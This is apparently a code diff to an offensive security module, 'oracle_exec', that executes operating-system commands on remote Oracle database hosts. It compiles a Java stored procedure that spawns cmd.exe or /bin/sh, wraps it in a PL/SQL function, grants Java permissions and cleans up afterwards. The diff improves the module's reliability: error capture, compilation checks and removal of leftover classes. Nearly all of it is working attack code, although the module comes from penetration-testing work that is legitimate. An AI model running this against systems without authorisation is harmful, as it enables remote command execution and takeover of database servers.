@@ -5,7 +5,7 @@ class NXCModule:
     """Execute OS commands on the remote Oracle host via Java stored procedures."""
 
     name = "oracle_exec"
-    description = "Execute OS commands via Oracle Java stored procedures (requires DBA/SYSDBA)"
+    description = "Execute OS commands via Oracle Java stored procedures — non-interactive, no reverse shell (requires DBA/SYSDBA)"
     supported_protocols = ["oracle"]
     opsec_safe = False
     category = CATEGORY.PRIVILEGE_ESCALATION
@@ -77,15 +77,22 @@ class NXCModule:
         for grantee, perm, target, action in perms:
             try:
                 cursor = conn.cursor()
-                cursor.execute(
-                    f"BEGIN DBMS_JAVA.grant_permission('{grantee}', '{perm}', '{target}', '{action}'); END;"
-                )
+                cursor.callproc("DBMS_JAVA.grant_permission", [grantee, perm, target, action])
                 conn.commit()
                 cursor.close()
             except Exception as e:
                 log.debug(f"Java permission grant ({perm}): {e}")
 
     def create_java_source(self, conn, log):
+        # Drop any orphaned compiled class left behind by a previous DROP JAVA SOURCE
+        for drop in ('DROP JAVA CLASS "NxcOsCmd"', "DROP FUNCTION nxc_oscmd"):
+            try:
+                cursor = conn.cursor()
+                cursor.execute(drop)
+                cursor.close()
+            except Exception:
+                pass
+
         src = (
             'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "NxcOsCmd" AS\n'
             "import java.io.*;\n"
@@ -96,15 +103,16 @@ class NXCModule:
             '        if (os.contains("windows")) {\n'
             '            shell = new String[]{"cmd.exe", "/c", cmd};\n'
             "        } else {\n"
-            '            shell = new String[]{"/bin/sh", "-c", cmd};\n'
+            '            shell = new String[]{"/bin/sh", "-c",\n'
+            '                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; " + cmd};\n'
             "        }\n"
-            "        Process p = Runtime.getRuntime().exec(shell);\n"
+            "        ProcessBuilder pb = new ProcessBuilder(shell);\n"
+            "        pb.redirectErrorStream(true);\n"
+            "        Process p = pb.start();\n"
             "        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
-            "        BufferedReader be = new BufferedReader(new InputStreamReader(p.getErrorStream()));\n"
             "        StringBuilder sb = new StringBuilder();\n"
             "        String line;\n"
             '        while ((line = br.readLine()) != null) sb.append(line).append("\\n");\n'
-            '        while ((line = be.readLine()) != null) sb.append("[stderr] ").append(line).append("\\n");\n'
             "        p.waitFor();\n"
             '        if (sb.length() > 32000) return sb.substring(0, 32000) + "... (truncated)";\n'
             "        return sb.toString().trim();\n"
@@ -113,17 +121,29 @@ class NXCModule:
         )
         cursor = conn.cursor()
         cursor.execute(src)
-        conn.commit()
         cursor.close()
 
-    def create_wrapper(self, conn, log):
-        wrapper = (
-            "CREATE OR REPLACE FUNCTION nxc_oscmd(p_cmd IN VARCHAR2) RETURN VARCHAR2 "
-            "AS LANGUAGE JAVA NAME 'NxcOsCmd.exec(java.lang.String) return java.lang.String'"
-        )
+        # CREATE JAVA SOURCE never raises on compilation failure — check explicitly
         cursor = conn.cursor()
-        cursor.execute(wrapper)
-        conn.commit()
+        cursor.execute(
+            "SELECT status FROM user_objects WHERE object_name = 'NxcOsCmd' AND object_type = 'JAVA CLASS'"
+        )
+        row = cursor.fetchone()
+        cursor.close()
+        if not row or row[0] != "VALID":
+            cursor = conn.cursor()
+            cursor.execute("SELECT text FROM user_errors WHERE name = 'NxcOsCmd' ORDER BY sequence")
+            errors = "; ".join(r[0].strip() for r in cursor.fetchall())
+            cursor.close()
+            raise RuntimeError(f"Java compilation failed: {errors or 'no details available'}")
+
+    def create_wrapper(self, conn, log):
+        # PL/SQL DDL (CREATE FUNCTION) requires a trailing semicolon, unlike SQL DDL
+        cursor = conn.cursor()
+        cursor.execute(
+            "CREATE OR REPLACE FUNCTION nxc_oscmd(p_cmd IN VARCHAR2) RETURN VARCHAR2 "
+            "AS LANGUAGE JAVA NAME 'NxcOsCmd.exec(java.lang.String) return java.lang.String';"
+        )
         cursor.close()
 
     def run_cmd(self, conn, log):
@@ -133,7 +153,11 @@ class NXCModule:
         return output
 
     def cleanup(self, conn, log):
-        for stmt in ("DROP FUNCTION nxc_oscmd", 'DROP JAVA SOURCE "NxcOsCmd"'):
+        for stmt in (
+            "DROP FUNCTION nxc_oscmd",
+            'DROP JAVA SOURCE "NxcOsCmd"',
+            'DROP JAVA CLASS "NxcOsCmd"',
+        ):
             try:
                 cursor = conn.cursor()
                 cursor.execute(stmt)
